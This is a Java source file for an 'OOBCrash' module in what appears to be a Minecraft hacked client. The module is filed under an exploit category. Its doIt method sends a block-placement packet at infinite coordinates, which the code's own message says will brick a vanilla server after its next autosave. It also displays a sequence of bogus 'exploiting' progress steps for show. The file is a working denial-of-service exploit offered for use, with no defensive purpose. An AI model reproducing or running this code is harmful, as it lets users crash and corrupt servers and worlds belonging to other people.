/*
 * This file is part of the atomic client distribution.
 * Copyright (c) 2021-2021 0x150.
 */

package me.x150.sipprivate.feature.module.impl;

import me.x150.sipprivate.CoffeeClientMain;
import me.x150.sipprivate.feature.module.Module;
import me.x150.sipprivate.feature.module.ModuleType;
import me.x150.sipprivate.helper.font.FontRenderers;
import me.x150.sipprivate.helper.render.Renderer;
import me.x150.sipprivate.helper.util.Utils;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;

public class OOBCrash extends Module {
    record Step(String t, long takes) {}
    Step[] bogusSteps = new Step[] {
        new Step("Exploiting packet handler", 2000),
            new Step("Attempting to override isValid(Lnet/minecraft/util/math/Vec3d;)Z method", 1000),
            new Step("Packet handler dump: 0x05 0x13 0x11 0x92 (INJECTING HERE) 0x00 0x00 0x00 0x00",2000),
            new Step("Requesting out of bounds", 1000),
            new Step("Sending packet", 100),
            new Step("Overwriting isValid:Z", 100),
            new Step("Cancelling packet checks", 100),
            new Step("Finalizing", 1000),
            new Step("", 1000)
    };
    long startTime = System.currentTimeMillis();
    public OOBCrash() {
        super("OOBCrash", "Crashes / even bricks a vanilla server by requesting block placement", ModuleType.EXPLOIT);
    }

    @Override public void tick() {

    }
void doIt() {
    BlockHitResult bhr = new BlockHitResult(Objects.requireNonNull(CoffeeClientMain.client.player)
            .getPos(), Direction.DOWN, new BlockPos(new Vec3d(Double.POSITIVE_INFINITY, 5, Double.POSITIVE_INFINITY)), false);
    PlayerInteractBlockC2SPacket p = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr);
    Objects.requireNonNull(CoffeeClientMain.client.getNetworkHandler()).sendPacket(p);
    Utils.Logging.messageChat("Wait a bit for this to complete, the server will run fine until it autosaves the world. After that, it will just brick itself.");
    setEnabled(false);
}
Step current;

    @Override public void onFastTick() {
        long timeDelay = System.currentTimeMillis() - startTime;
        timeDelay = Math.max(0, timeDelay);
        long passed = 0;
        for (Step bogusStep : bogusSteps) {
            if (passed < timeDelay && passed + bogusStep.takes > timeDelay) {
                current = bogusStep;
                break;
            }
            passed += bogusStep.takes;
        }
        if (current.t.isEmpty()) {
            doIt();
        }
    }

    @Override public void enable() {
        startTime = System.currentTimeMillis();
    }

    @Override public void disable() {

    }

    @Override public String getContext() {
        return null;
    }

    @Override public void onWorldRender(MatrixStack matrices) {

    }

    @Override public void onHudRender() {
        if (current != null) {
            FontRenderers.getMono().drawCenteredString(Renderer.R3D.getEmptyMatrixStack(), current.t, CoffeeClientMain.client.getWindow().getScaledWidth() / 2f, CoffeeClientMain.client.getWindow()
                    .getScaledHeight() / 2f, 0xFFFFFF);
        }
    }
}
